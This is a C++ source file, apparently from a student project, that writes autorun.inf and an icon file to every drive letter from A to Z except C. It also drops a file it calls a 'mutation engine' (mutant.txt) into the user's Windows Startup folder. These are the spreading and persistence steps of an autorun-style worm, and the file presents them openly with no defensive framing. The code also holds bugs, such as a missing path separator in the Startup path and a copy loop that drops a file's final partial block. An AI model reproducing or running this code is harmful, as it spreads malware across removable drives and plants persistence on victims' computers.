#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>

using namespace std;

/*
 * copyfiles.cpp
 * 
 * Copies files relevant to the program to all drives in computer. All removable 
 * drives receive all program files, whereas the Startup folder in the computer 
 * receives only the XtoM program.
 *
 * Written by Nicholas Allen
 * allen.2020@osu.edu
 */
int main(void) 
{
	size_t len = 0;
	
	const int numFiles = 2;
	char *filenames[numFiles] = { "autorun.inf", "driveicon.ico" };
	
	const int numDrives = 25;
	char *destdrives[numDrives] = {"A:\\", "B:\\", "D:\\", "E:\\",
								"F:\\", "G:\\", "H:\\", "I:\\", "J:\\",
								"K:\\", "L:\\", "M:\\", "N:\\", "O:\\",
								"P:\\", "Q:\\", "R:\\", "S:\\", "T:\\",
								"U:\\", "V:\\", "W:\\", "X:\\", "Y:\\",
								"Z:\\"
	};
	char buffer[BUFSIZ] = { '\0' };
	
	// Copy files to all drives
	
	char src[48];
	char dest[48];
	
	for(int drive = 0; drive < numDrives; drive++)
	{
		for(int file = 0; file < numFiles; file++)
		{
			strcpy(src, filenames[file]);
			
			strcpy(dest, destdrives[drive]);
			strcat(dest, filenames[file]);
			
			/*
			// Remove file if it already exists on disk
			if(remove(dest))
			{
				cout << "File " << dest;
				cout << " does not already exist or could not be deleted." << endl;
			}
			else
			{
				cout << "File " << dest;
				cout << " successfully deleted." << endl;
			}
			*/
			
			FILE *in = fopen(src, "rb");
			FILE *out = fopen(dest, "wb");
			
			if(in == NULL || out == NULL)
			{
				cout << "Error copying " << filenames[file];
				cout << " to drive " << destdrives[drive];
				cout << endl;
				
				in = out = 0;
			}
			else
			{
				while((len = fread(buffer, BUFSIZ, 1, in)) > 0)
				{
					fwrite(buffer, BUFSIZ, 1, out);
				}
				
				cout << "Successfully wrote to " << destdrives[drive];
				cout << endl;
				
				fclose(in);
				fclose(out);
			}
		}
	}
	
	//Move mutation engine to Startup directory
	strcpy(src, "mutant.txt");
	strcpy(dest, getenv("USERPROFILE"));
	strcat(dest, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
	strcat(dest, "mutant.txt");
	
	FILE *in = fopen(src, "rb");
	FILE *out = fopen(dest, "wb");
	
	if(in == NULL || out == NULL)
	{
		cout << "Error copying mutant.txt to startup folder";
		cout << endl;
		
		in = out = 0;
	}
	else
	{
		while((len = fread(buffer, BUFSIZ, 1, in)) > 0)
		{
			fwrite(buffer, BUFSIZ, 1, out);
		}
		
		cout << "Successfully wrote mutant.txt to startup folder";
		cout << endl;
		
		fclose(in);
		fclose(out);
	}
	
	return 0;
}
